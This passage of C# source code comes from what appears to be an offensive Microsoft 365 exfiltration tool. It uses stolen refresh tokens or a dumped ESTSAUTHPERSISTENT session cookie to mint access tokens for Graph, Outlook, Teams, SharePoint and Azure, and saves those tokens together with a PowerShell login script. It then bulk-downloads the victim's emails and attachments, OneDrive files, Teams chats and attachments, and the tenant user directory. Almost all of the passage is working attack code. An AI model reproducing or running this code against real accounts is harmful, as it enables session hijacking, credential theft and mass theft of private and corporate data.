                    await MsGraphExfilAsync(msGraphToken.bearerToken, baseUserOutPath);

                if (adGraphToken.bearerToken?.access_token != null)
                    await AdGraphExfilAsync(adGraphToken.bearerToken, baseUserOutPath);


            }

            if (exifilOptions.OWA)
            {
                //Get the tokens neede if we don't already have them
                if (outlookToken.bearerToken?.access_token == null)
                    outlookToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://outlook.office365.com", clientId: clientId);

                //Did we get them, if so let's exfil!
                if (outlookToken.bearerToken?.access_token != null)
                    await OWAExfilAsync(outlookToken.bearerToken, baseUserOutPath);

            }

            if (exifilOptions.Teams)
            {
                //In order to exfilrate Teams, we need to know the sharepoint personal and company site
                //We can get this using either the Teams API

                //Check if we have/can get an teams token
                if (teamsToken.bearerToken?.access_token == null)
                    teamsToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://api.spaces.skype.com", clientId: clientId);

                //Do we have a teams token?
                if (teamsToken.bearerToken != null)
                {

                    TeamsHandler teamsHandler = new TeamsHandler(teamsToken.bearerToken, _globalProperties);

                    List<GetTenatsResp> tenantInfo = await teamsHandler.GetTenantsInfo();
                    FilesAvailabilityResp sharePointInfo = await teamsHandler.GetSharePointInfo();


                    File.WriteAllText(Path.Combine(baseUserOutPath, "Tenant.json"), JsonConvert.SerializeObject(tenantInfo, Formatting.Indented));
                    File.WriteAllText(Path.Combine(baseUserOutPath, "SharePoint.json"), JsonConvert.SerializeObject(sharePointInfo, Formatting.Indented));

                    if (sharePointInfo?.personalRootFolderUrl != null)
                    {

                        //Get the tokens neede if we don't already have them
                        if (companySharePointToken.bearerToken?.access_token == null)
                            companySharePointToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), sharePointInfo.personalRootFolderUrl.Replace("-my", ""), clientId: clientId);
                        //Get the tokens neede if we don't already have them
                        if (personalOneDriveToken.bearerToken?.access_token == null)
                            personalOneDriveToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), sharePointInfo.personalRootFolderUrl, clientId: clientId);

                        //Did we get them, if so let's exfil!
                        if (teamsToken.bearerToken?.access_token != null && personalOneDriveToken.bearerToken?.access_token != null)
                            await TeamsExfilAsync(teamsToken.bearerToken, personalOneDriveToken.bearerToken, companySharePointToken.bearerToken, baseUserOutPath);

                    }



                }
            }

            if (exifilOptions.Tokens)
            {
                if (msGraphToken.bearerToken?.access_token == null)
                    msGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com", clientId: clientId);

                //We need either a teams token or Graph API token in order to get the SharePoint URL
                if (msGraphToken.bearerToken != null)
                {
                    var oneDriveHandler = new OneDriveHandler(msGraphToken.bearerToken, username, _globalProperties, _databaseHandler);

                    //Pretty sure this can be done without Auth
                    SharePointSite siteRoot = await oneDriveHandler.GetSiteRoot();

                    if (siteRoot != null)
                    {


                        companySharePointToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), siteRoot.WebUrl.Replace("-my", ""), clientId: clientId);
                        personalOneDriveToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), siteRoot.WebUrl, clientId: clientId);
                    }
                }


                outlookToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://outlook.office365.com", clientId: clientId);

                azurePSToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://management.core.windows.net/", clientId: clientId);

                msGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com", clientId: clientId);

                adGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.windows.net", clientId: clientId);


                var bearerTokensOutPath = Path.Combine(baseUserOutPath, @"Tokens");
                Directory.CreateDirectory(bearerTokensOutPath);

                File.WriteAllText(Path.Combine(bearerTokensOutPath, "TeamsToken.txt"), JsonConvert.SerializeObject(inputTokenData, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "AdGraphToken.txt"), JsonConvert.SerializeObject(adGraphToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "MsGraphToken.txt"), JsonConvert.SerializeObject(msGraphToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "OutlookToken.txt"), JsonConvert.SerializeObject(outlookToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "OneDriveToken.txt"), JsonConvert.SerializeObject(personalOneDriveToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "SharePointToken.txt"), JsonConvert.SerializeObject(companySharePointToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "AzureCLIToken.txt"), JsonConvert.SerializeObject(azurePSToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "loginAAD.ps1"), $"$AadToken=\"{adGraphToken.bearerToken?.access_token}\"\n$MsgToken=\"{msGraphToken.bearerToken?.access_token}\"\nConnect-MsolService -AdGraphAccessToken $AadToken -MsGraphAccessToken $MsgToken -AzureEnvironment 'AzureCloud'");

            }




            if (exifilOptions.OneDrive)
            {


                if (msGraphToken.bearerToken?.access_token == null)
                    msGraphToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), "https://graph.microsoft.com", clientId: clientId);

                //We need either a teams token or Graph API token in order to get the SharePoint URL
                if (msGraphToken.bearerToken != null)
                {
                    var oneDriveHandler = new OneDriveHandler(msGraphToken.bearerToken, username, _globalProperties, _databaseHandler);


                    SharePointSite siteRoot = await oneDriveHandler.GetSiteRoot();

                    //Get the tokens neede if we don't already have them
                    if (companySharePointToken.bearerToken?.access_token == null)
                        companySharePointToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), siteRoot.WebUrl.Replace("-my", ""), clientId: clientId);

                    if (personalOneDriveToken.bearerToken?.access_token == null)
                        personalOneDriveToken = await msolHandler.RefreshAttempt(inputTokenData, _globalProperties.GetBaseUrl(), siteRoot.WebUrl, clientId: clientId);


                    //Did we get them, if so let's exfil!
                    if (companySharePointToken.bearerToken != null && inputTokenData != null)
                        await OneDriveExfilAsync(companySharePointToken.bearerToken, msGraphToken.bearerToken, inputTokenData, personalOneDriveToken.bearerToken, oneDriveHandler, baseUserOutPath);
                }

            }
        }
        private static async Task CookieExfilAccountAsync(string outpath, List<CookieObject> cookieObjects, ExifilOptions exifilOptions, MSOLHandler msolHandler)
        {
            //Check to confirm that we have the coookies we need
            if (!cookieObjects.Select(cookie => cookie.name).Contains("ESTSAUTHPERSISTENT"))
            {
                Console.WriteLine("[+] Could not found required ESTSAUTHPERSISTENT cookie in dump, user might not be logged into Microsoft");
            }

            //Extract the information we need from the dump
            var tokenDict = new List<(string username, PulledTokens pulledToken)>() { };
            JwtSecurityTokenHandler jwsSecurityHandler = new JwtSecurityTokenHandler();

            //Look for accessTokens inside cookie objects and add them to the database!
            //TODO: Make sure we do not add tokens that are already in the database, and that the tokens we add are infact valid!

            foreach (var possibleToken in cookieObjects)
            {
                var regeexData = Regex.Match(possibleToken.value, @"(ey[a-zA-Z0-9_=]+)\.([a-zA-Z0-9_=]+)\.([a-zA-Z0-9_\-\+\/=]*)");
                if (regeexData.Success)
                {
                    string token = regeexData.Value;
                    JwtSecurityToken jwtSecurityToken = jwsSecurityHandler.ReadJwtToken(token);

                    if (Helpers.Generic.hasValidRecUri(jwtSecurityToken))
                    {
                        PulledTokens parsedTokenObject = Helpers.Generic.ParseSingleAccessToken(jwtSecurityToken);
                        var tempTokenDictObject = (Helpers.Generic.GetUsername(jwtSecurityToken.RawData), parsedTokenObject);
                        if (!tokenDict.Contains(tempTokenDictObject))
                        {
                            tokenDict.Add(tempTokenDictObject);

                            //Add a check to avoid adding tokens like crazy
                            _databaseHandler.WriteToken(parsedTokenObject);
                        }

                    }
                }
            }

            //We need an tenantId!
            string tenantId = "";
            string userName = "";

            //If this fails, we could attempt to get the tenantId some other way? Maybe a public enum method or so
            if (tokenDict.Count() > 0)
            {
                var firstToken = ((BearerTokenResp)tokenDict.FirstOrDefault().pulledToken).access_token;
                tenantId = Helpers.Generic.GetTenantId(firstToken);
                userName = Helpers.Generic.GetUsername(firstToken);
            }
            else
            {
                Console.WriteLine("[!] Failed to parse JWT and get TenantId automatically, what is the targets email?");
                Console.WriteLine("#>");
                string targetEmail = Console.ReadLine();
                try
                {
                    string domain = targetEmail.Trim().Split("@")[1];
                    GetOpenIdConfigResp openIdConfig = await msolHandler.GetOpenIdConfig(domain);
                    tenantId = openIdConfig.authorization_endpoint.Split("/")[3];
                }
                catch (Exception)
                {
                    Console.WriteLine("[!] Failed to retrive TenantID, cannot continue without");
                    Environment.Exit(0);
                }
             
                
            }
            string cookie = "ESTSAUTHPERSISTENT=" + cookieObjects.Where(x => x.name.Equals("ESTSAUTHPERSISTENT")).FirstOrDefault()?.value;
            if (string.IsNullOrEmpty(cookie))
            {
                Console.WriteLine("[!] ESTSAUTHPERSISTENT cookie was empty!");
                Environment.Exit(0);
            }

            //TODO: Create dummy user to be added into the validUsers database so we can pick these at an later stage
            //Get the team's access token
            BearerTokenResp teamsToken = new BearerTokenResp() { };
            try
            {
                var attempSingleSignOn = await msolHandler.CookieGetAccessToken(tenantId, userName, cookie, targetResource: "https://api.spaces.skype.com", checkCache: true);
                //Let's try to abuse single sign on
                teamsToken = attempSingleSignOn.bearerToken;
            }
            catch (Exception ex)
            {
                //TODO: That failed, check if we have it cached
            }
            TeamsHandler teamsHandler = new TeamsHandler(teamsToken, _globalProperties);

            List<GetTenatsResp> tenantInfo = await teamsHandler.GetTenantsInfo();
            FilesAvailabilityResp sharePointInfo = await teamsHandler.GetSharePointInfo();


            var baseUserOutPath = Path.Combine(outpath, Helpers.Generic.MakeValidFileName(userName));
            Directory.CreateDirectory(baseUserOutPath);

            File.WriteAllText(Path.Combine(baseUserOutPath, "Tenant.json"), JsonConvert.SerializeObject(tenantInfo, Formatting.Indented));
            File.WriteAllText(Path.Combine(baseUserOutPath, "SharePoint.json"), JsonConvert.SerializeObject(sharePointInfo, Formatting.Indented));


            string companySharePointUrl = "";
            string personalSharePointUrl = "";

            if (sharePointInfo?.personalRootFolderUrl == null)
            {
                _databaseHandler.WriteLog(new Log("EXFIL", $"User has not been configured / licensed for o365, skipping OneDrive/SharePoint", "") { }, true);

                sharePointInfo = new FilesAvailabilityResp();
                sharePointInfo.personalRootFolderUrl = "invalid";
                exifilOptions.OneDrive = false;

            }
            else
            {
                companySharePointUrl = sharePointInfo.personalRootFolderUrl.Replace("-my", "");
                personalSharePointUrl = sharePointInfo.personalRootFolderUrl;
            }

            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) companySharePointToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) personalOneDriveToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) outlookToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) msGraphToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });
            (BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError) adGraphToken = (new BearerTokenResp() { }, new BearerTokenErrorResp() { });

            var cookieBaseUrl = _globalProperties.GetBaseUrl().Replace("/common/oauth2/token", "");

            if (exifilOptions.Tokens)
            {

                companySharePointToken = await msolHandler.CookieGetAccessToken(tenantId, userName, cookie, cookieBaseUrl, targetResource: companySharePointUrl);

                personalOneDriveToken = await msolHandler.CookieGetAccessToken(tenantId, userName, cookie, cookieBaseUrl, targetResource: personalSharePointUrl);

                outlookToken = await msolHandler.CookieGetAccessToken(tenantId, userName, cookie, cookieBaseUrl, targetResource: "https://outlook.office365.com");

                msGraphToken = await msolHandler.CookieGetAccessToken(tenantId, userName, cookie, cookieBaseUrl, targetResource: "https://graph.microsoft.com");

                adGraphToken = await msolHandler.CookieGetAccessToken(tenantId, userName, cookie, cookieBaseUrl, targetResource: "https://graph.windows.net");


                var bearerTokensOutPath = Path.Combine(baseUserOutPath, @"Tokens");
                Directory.CreateDirectory(bearerTokensOutPath);

                File.WriteAllText(Path.Combine(bearerTokensOutPath, "TeamsToken.txt"), JsonConvert.SerializeObject(teamsToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "AdGraphToken.txt"), JsonConvert.SerializeObject(adGraphToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "MsGraphToken.txt"), JsonConvert.SerializeObject(msGraphToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "OutlookToken.txt"), JsonConvert.SerializeObject(outlookToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "OneDriveToken.txt"), JsonConvert.SerializeObject(personalOneDriveToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "SharePointToken.txt"), JsonConvert.SerializeObject(companySharePointToken.bearerToken, Formatting.Indented));
                File.WriteAllText(Path.Combine(bearerTokensOutPath, "loginAAD.ps1"), $"$AadToken=\"{adGraphToken.bearerToken.access_token}\"\n$MsgToken=\"{msGraphToken.bearerToken.access_token}\"\nConnect-MsolService -AdGraphAccessToken $AadToken -MsGraphAccessToken $MsgToken -AzureEnvironment 'AzureCloud'");

            }

            if (exifilOptions.Teams)
            {
                //Get the tokens neede if we don't already have them
                if (personalOneDriveToken.bearerToken?.access_token == null)
                    personalOneDriveToken = await msolHandler.CookieGetAccessToken(tenantId, userName, cookie, cookieBaseUrl, personalSharePointUrl);


                if (companySharePointToken.bearerToken?.access_token == null)
                    companySharePointToken = await msolHandler.CookieGetAccessToken(tenantId, userName, cookie, cookieBaseUrl, companySharePointUrl);

                //Did we get them, if so let's exfil!
                if (teamsToken?.access_token != null && personalOneDriveToken.bearerToken?.access_token != null)
                    await TeamsExfilAsync(teamsToken, personalOneDriveToken.bearerToken, companySharePointToken.bearerToken, baseUserOutPath);




            }
            if (exifilOptions.AAD)
            {
                //Get the tokens needed if we don't already have them
                if (adGraphToken.bearerToken?.access_token == null)
                    adGraphToken = await msolHandler.CookieGetAccessToken(tenantId, userName, cookie, cookieBaseUrl, "https://graph.windows.net");

                if (msGraphToken.bearerToken?.access_token == null)
                    msGraphToken = await msolHandler.CookieGetAccessToken(tenantId, userName, cookie, cookieBaseUrl, "https://graph.microsoft.com");


                //Did we get them, if so let's exfil!
                if (adGraphToken.bearerToken?.access_token != null)
                    await AdGraphExfilAsync(adGraphToken.bearerToken, baseUserOutPath);

                if (msGraphToken.bearerToken?.access_token != null)
                    await MsGraphExfilAsync(msGraphToken.bearerToken, baseUserOutPath);
            }

            if (exifilOptions.OWA)
            {
                //Get the tokens neede if we don't already have them
                if (outlookToken.bearerToken?.access_token == null)
                    outlookToken = await msolHandler.CookieGetAccessToken(tenantId, userName, cookie, cookieBaseUrl, "https://outlook.office365.com");

                //Did we get them, if so let's exfil!
                if (outlookToken.bearerToken?.access_token != null)
                    await OWAExfilAsync(outlookToken.bearerToken, baseUserOutPath);

                // File.WriteAllText(Path.Combine(outlookOutPath, "Emails.json"), JsonConvert.SerializeObject(allEmails, Formatting.Indented));
            }



            if (exifilOptions.OneDrive)
            {

                //Get the tokens neede if we don't already have them
                if (companySharePointToken.bearerToken?.access_token == null)
                    companySharePointToken = await msolHandler.CookieGetAccessToken(tenantId, userName, cookie, cookieBaseUrl, companySharePointUrl);

                if (personalOneDriveToken.bearerToken?.access_token == null)
                    personalOneDriveToken = await msolHandler.CookieGetAccessToken(tenantId, userName, cookie, cookieBaseUrl, personalSharePointUrl);

                if (msGraphToken.bearerToken?.access_token == null)
                    msGraphToken = await msolHandler.CookieGetAccessToken(tenantId, userName, cookie, cookieBaseUrl, "https://graph.microsoft.com");

                var oneDriveHandler = new OneDriveHandler(msGraphToken.bearerToken, userName, _globalProperties, _databaseHandler);
                //Did we get them, if so let's exfil!
                if (msGraphToken.bearerToken != null && companySharePointToken.bearerToken != null && cookie != null)
                    await OneDriveExfilAsync(companySharePointToken.bearerToken, msGraphToken.bearerToken, teamsToken, personalOneDriveToken.bearerToken, oneDriveHandler, baseUserOutPath);

            }

        }


        #region baseExfilFunctions
        private static async Task OneDriveExfilAsync(BearerTokenResp companySharePointToken, BearerTokenResp msGraphToken, BearerTokenResp teamsToken, BearerTokenResp personalSharePointToken, OneDriveHandler oneDriveGrapHandler, string outpath)
        {
            outpath = Path.Combine(outpath, "OneDrive");
            var username = Helpers.Generic.GetUsername(teamsToken.access_token);
            var sharePointHandler = new SharePointHandler(companySharePointToken, username, _globalProperties, _databaseHandler);
            var personalSharePointHandler = new SharePointHandler(personalSharePointToken, username, _globalProperties, _databaseHandler);

            var teamsHandler = new TeamsHandler(teamsToken, _globalProperties);


            _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating shared files from OneDrive", "") { }, true);
            await oneDriveGrapHandler.GetShared(outpath);


            _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating the entire personal OneDrive", "") { }, true);
            await oneDriveGrapHandler.DumpPersonalOneDrive(outpath);


            TeamsFileResp recentFiles = await teamsHandler.GetRecentFiles("EXFIL");

            if (recentFiles != null)
            {
                _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating {recentFiles.value.Length} recent files accessible by user", "") { }, true);

                await sharePointHandler.DownloadRecentFiles(recentFiles, outpath, "EXFIL");

                await oneDriveGrapHandler.DownloadRecentFiles(recentFiles, outpath, "EXFIL");

                await personalSharePointHandler.DownloadRecentFiles(recentFiles, outpath, "EXFIL");
            }

        }
        private static async Task TeamsExfilAsync(BearerTokenResp teamsToken, BearerTokenResp oneDriveToken, BearerTokenResp sharePointToken, string outpath)
        {

            outpath = Path.Combine(outpath, "Teams");
            var userId = Helpers.Generic.GetUserId(teamsToken.access_token);
            var username = Helpers.Generic.GetUsername(teamsToken.access_token);
            var displayName = Helpers.Generic.GetDisplayName(teamsToken.access_token);

            var teamsHandler = new TeamsHandler(teamsToken, _globalProperties);

            _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating recently used contacts", "") { }, true);
            var contactListLogsOutPath = Path.Combine(outpath, "Contactlist");
            Directory.CreateDirectory(contactListLogsOutPath);

            var contactsInfo = await teamsHandler.GetWorkingWithList(userId);
            File.WriteAllText(Path.Combine(contactListLogsOutPath, "Contacts.json"), JsonConvert.SerializeObject(contactsInfo, Formatting.Indented));


            //We need a skype token to get other stuff
            (SkypeTokenResp skypeTokenResp, SkypeErrorRespons skypeErrorRespons) getSkypeToken = await teamsHandler.SetSkypeToken();
            if (getSkypeToken.skypeErrorRespons != null)
                _databaseHandler.WriteLog(new Log("ENUM", $"Error getting Skype token: {getSkypeToken.skypeErrorRespons.message}", ""));




            var attachmentsLogsOutPath = Path.Combine(outpath, "Attachments");
            Directory.CreateDirectory(attachmentsLogsOutPath);

            UserConversationsResp chatConversations = await teamsHandler.GetConversations();

            //Check if we have any conversations to look at
            if (chatConversations != null)
            {
                _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating Teams chat logs and attachments ", "") { }, true);

                List<Conversations> conversationList = new List<Conversations>() { };

                //Setup the progressBar
                int conversationCount = 0;
                int totalConversationCount = chatConversations.conversations.Count();
                using (var progress = new ProgressBar())
                {
                    await chatConversations.conversations.ParallelForEachAsync(
                    async conversation =>
                    {
                        //Get the chat logs for the conversation
                        ChatLogResp chatsLogs = await teamsHandler.GetChatLogs(conversation);
                        //If no empty
                        if (chatsLogs.messages != null)
                        {
                            //Parse it into a cleaner format
                            Conversations parsedConversation = new Conversations(chatsLogs, conversation);
                            conversationList.Add(parsedConversation);

                            //for each chat message in the current conversation, where there is attachements
                            foreach (ChatMessages chatMsg in parsedConversation.chatMessagesArray.Where(x => x.Properties?.files != null))
                            {
                                //each attachment file data
                                foreach (FileData fileObject in chatMsg.FileObject)
                                {
                                    try
                                    {
                                        /*
                                        * The files attached with Teams are eiter hosted in the user personal oneDrive (Personal Sharepoint), or company SharePoint
                                        * Identify if we can fetch the resource based on what
                                        */

                                        //If we have atleast one accessToken for each
                                        if (oneDriveToken.access_token != null || sharePointToken.access_token != null)
                                        {
                                            using (var httpClient = new HttpClient())
                                            {

                                                //We need to look at the baseURL to determine what client to
                                                var url = @$"{fileObject.baseUrl}/_api/web/GetFileById('{fileObject.id}')/$value";

                                                var httpReq = new HttpRequestMessage(HttpMethod.Get, url);
                                                httpReq.Headers.Add("User-Agent", _globalProperties.TeamFiltrationConfig.UserAgent);

                                                //TODO: Add error handling for this
                                                if (Helpers.Generic.getTokenResource(sharePointToken.access_token).Host == new Uri(fileObject.baseUrl).Host)
                                                    httpReq.Headers.Add("Authorization", $"Bearer {sharePointToken.access_token}");
                                                else
                                                    httpReq.Headers.Add("Authorization", $"Bearer {oneDriveToken.access_token}");

                                                var oneDriveReq = await httpClient.SendAsync(httpReq);

                                                if (oneDriveReq.IsSuccessStatusCode)
                                                {
                                                    var rawData = await oneDriveReq.Content.ReadAsByteArrayAsync();
                                                    if (rawData.Length > 0)
                                                        File.WriteAllBytes(Path.Combine(attachmentsLogsOutPath, fileObject.fileName), rawData);
                                                }


                                            }
                                        }
                                    }
                                    catch (Exception ex)
                                    {

                                    }

                                }

                            }
                        }
                        conversationCount++;
                        progress.Report((double)conversationCount / totalConversationCount);
                    }, maxDegreeOfParallelism: 10);
                }

                _databaseHandler.WriteLog(new Log("EXFIL", $"Parsing conversations", "") { }, true);
                var conversationLogsOutPath = Path.Combine(outpath, "Conversations");
                Directory.CreateDirectory(conversationLogsOutPath);

                //Add progress bar
                int praseconversationCount = 0;
                int parseTotalConversationCount = conversationList.Count();
                using (var parseProgress = new ProgressBar())
                {
                    foreach (var conversationObject in conversationList.Where(x => x.chatMessagesArray.Count() > 0))
                    {
                        //This method removes junk chat messages
                        var convSimple = (ConversationsSimple)(conversationObject, contactsInfo);

                        if (convSimple.Messages.Count() > 0)
                        {
                            File.WriteAllText(Path.Combine(conversationLogsOutPath, Helpers.Generic.StringToGUID(conversationObject.Id) + ".txt"),
                                JsonConvert.SerializeObject(convSimple, Formatting.Indented));



                            var chatMessage = new HTMLChat(displayName, conversationObject.Title);
                            string filename = !string.IsNullOrEmpty(conversationObject.Title) ? Helpers.Generic.MakeValidFileName(conversationObject.Title).Replace(" ", "_").Replace("@", "_") : Helpers.Generic.StringToGUID(conversationObject.Id).ToString();
                            File.WriteAllText(Path.Combine(conversationLogsOutPath, filename + ".html"), chatMessage.GenerateChat(convSimple));
                        }
                        praseconversationCount++;
                        parseProgress.Report((double)praseconversationCount / parseTotalConversationCount);
                    }
                }

            }

        }
        private static async Task OWAExfilAsync(BearerTokenResp outlookToken, string outpath)
        {

            outpath = Path.Combine(outpath, "Outlook");

            _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating emails from Outlook!", "") { }, true);
            var username = Helpers.Generic.GetUsername(outlookToken.access_token);

            var tokenExpires = DateTime.Now.AddSeconds(Convert.ToInt32(outlookToken.expires_in));

            OWAHandler oWAHandler = new OWAHandler(outlookToken, _globalProperties, _databaseHandler);
            var outlookOutPath = Path.Combine(outpath, "Emails");
            Directory.CreateDirectory(outlookOutPath);
            var allEmailsJsonPath = Path.Combine(outlookOutPath, "AllEmails.json");
            var allEmailsParsedJsonPath = Path.Combine(outlookOutPath, "AllEmails_Parsed.json");


            var test = await oWAHandler.GetCalendarEvents();


            Models.OWA.AllEmailsResp allEmailObjects = null;
            if (File.Exists(allEmailsJsonPath))
                allEmailObjects = JsonConvert.DeserializeObject<Models.OWA.AllEmailsResp>(File.ReadAllText(allEmailsJsonPath));
            else
            {
                allEmailObjects = await oWAHandler.GetAllEmails(_globalProperties.OwaLimit);
                File.WriteAllText(allEmailsJsonPath, JsonConvert.SerializeObject(allEmailObjects, Formatting.Indented));
            }
            var skipList = Directory.GetFiles(outlookOutPath, "*.html").Select(x => x.Split("_")[0].Substring(x.Split("_")[0].Length - 5)).ToArray().ToList();

            allEmailObjects.value = allEmailObjects.value.Where(x => !skipList.Contains(Helpers.Generic.StringToGUID(x.Id).ToString().Split("-")[0].Substring(0, 5))).ToList();

            if (allEmailObjects.value != null)
            {

                allEmailObjects.value = allEmailObjects.value.DistinctBy(x => x.Id).ToList();

                _databaseHandler.WriteLog(new Log("EXFIL", $"Fetched {allEmailObjects.value.Count()} email ID's , exfiltrating content!", "") { }, true);

                var outlookAttachmentOutPath = Path.Combine(outpath, "EmailAttachments");
                Directory.CreateDirectory(outlookAttachmentOutPath);

                int emailCount = 0;
                int TotalemailCount = allEmailObjects.value.Count();
                var allEmailsParsed = new List<Models.OWA.EmailResp>() { };

                using (var progress = new ProgressBar())
                {


                    await allEmailObjects.value.ToArray().ParallelForEachAsync(
                      async emailObject =>
                      {
                          try
                          {
                              //This is probably gonna take awhile, make sure the token dosent expire
                              if (tokenExpires >= DateTime.Now.AddMinutes(1))
                              {

                                  (Models.OWA.EmailResp emailResp, RateLimitData rateLimitData) oneEmail = await oWAHandler.GetEmailBody(emailObject.Id);


                                  if (oneEmail.rateLimitData.RateLimitRemaining < 10 && !string.IsNullOrEmpty(oneEmail.emailResp.Id))
                                  {
                                      Thread.Sleep((int)(oneEmail.rateLimitData.RateLimitReset - DateTime.Now).TotalMilliseconds);
                                  }

                                  if (oneEmail.emailResp.HasAttachments)
                                  {
                                      try
                                      {
                                          var attachmentObject = await oWAHandler.GetEmailAttachments(emailObject.Id);

                                          if (attachmentObject?.value != null)
                                          {
                                              foreach (var fileItem in attachmentObject?.value.Where(x => !string.IsNullOrEmpty(x.ContentType) && !string.IsNullOrEmpty(x.ContentBytes)).ToArray())
                                              {
                                                  byte[] dataContent = System.Convert.FromBase64String(fileItem.ContentBytes);

                                                  File.WriteAllBytes(Path.Combine(outlookAttachmentOutPath, ((DateTimeOffset)fileItem.LastModifiedDateTime).ToUnixTimeSeconds().ToString() + "_" + fileItem.Name), dataContent);
                                              }

                                          }

                                      }
                                      catch (Exception ex)
                                      {
                                          _databaseHandler.WriteLog(new Log("EXFIL", $"SOFT ERROR dumping attachments {oneEmail.emailResp.Subject}=> {ex.Message}", "") { }, true);

                                      }

                                  }



                                  if (oneEmail.emailResp?.Id != null && oneEmail.emailResp?.ReceivedDateTime != null && oneEmail.emailResp.Subject != null && !string.IsNullOrEmpty(oneEmail.emailResp.Body.Content))
                                  {

                                      allEmailsParsed.Add(oneEmail.emailResp);

                                      var uniqID = Helpers.Generic.StringToGUID(emailObject.Id).ToString().Split("-")[0];

                                      var fileName = uniqID + "_" + Helpers.Generic.MakeValidFileName(oneEmail.emailResp.Subject).Replace(" ", "_").Replace("@", "_") + ".html";


                                      int maxFilename = 250 - outlookOutPath.Length;

                                      if (fileName.Length >= maxFilename)
                                          fileName = fileName.Substring(0, maxFilename);

                                      var filePath = Path.Combine(outlookOutPath, fileName);
                                      if (!File.Exists(filePath))
                                      {
                                          File.WriteAllText(
                                              filePath,
                                              oneEmail.emailResp.Body.Content
                                            );
                                      }
                                      emailCount++;
                                      progress.Report((double)emailCount / TotalemailCount);
                                  }


                              }
                              else
                              {
                                  //One minutes before expiration, we refresh the token
                                  await oWAHandler.RefreshAccessToken();
                                  tokenExpires = DateTime.Now.AddSeconds(Convert.ToInt32(oWAHandler._bearerToken.expires_in));
                              }
                          }
                          catch (Exception ex)
                          {
                              _databaseHandler.WriteLog(new Log("EXFIL", $"SOFT ERROR getting email ID {emailObject.Id}=> {ex.Message}", "") { }, true);


                          }
                      },
                      maxDegreeOfParallelism: 7
                      );

                    File.WriteAllText(allEmailsParsedJsonPath, JsonConvert.SerializeObject(allEmailsParsed, Formatting.Indented));

                }

            }

        }
        public static async Task MsGraphExfilAsync(BearerTokenResp msGraphToken, string baseUserOutPath, bool logDb = true)
        {
            if (logDb)
                _databaseHandler.WriteLog(new Log("EXFIL", $"Exfiltrating AAD users and groups via MS graph API", "") { }, true);


            GraphHandler graphHandler = new GraphHandler(msGraphToken, Helpers.Generic.GetUsername(msGraphToken.access_token));
            var username = Helpers.Generic.GetUsername(msGraphToken.access_token);
            UsersResp graphUsers = await graphHandler.GetUsersMsGraph();

            if (!username.StartsWith("MissingUsername_"))
            {
                //Let's attempt to avoid adding service accounts
                var filteredUserPrincipalNames = graphUsers.value.Where(x =>
                //Check that it ends with the correct domain
                    x.userPrincipalName.EndsWith("@" + username.Split("@")[1]) &&
                    //Ignore all healthmailbox
                    !x.userPrincipalName.ToLower().Contains("healthmailbox") &&

                    //Ignore usernames with $
                    !x.userPrincipalName.ToLower().Contains("$") &&
                    x.jobTitle != null
                ).ToList();

                //remove accounts without a jobtitle?
                filteredUserPrincipalNames = filteredUserPrincipalNames.Where(x => !string.IsNullOrEmpty((string)x.jobTitle)).ToList();

                if (logDb)
                    _databaseHandler.WriteLog(new Log("EXFIL", $"Got {filteredUserPrincipalNames.Count} AAD users, appending to database as valid users!", "") { }, true);
                await filteredUserPrincipalNames.ParallelForEachAsync(
                     async upn =>
                     {
                         if (logDb)
                             try
                             {
                                 _databaseHandler.WriteValidAcc(new ValidAccount()
                                 {
                                     Username = upn.userPrincipalName.Trim().ToLower(),
                                     Id = Helpers.Generic.StringToGUID(upn.userPrincipalName.Trim().ToLower()).ToString()
                                 });
                             }
                             catch (Exception ex)
                             {

                                 
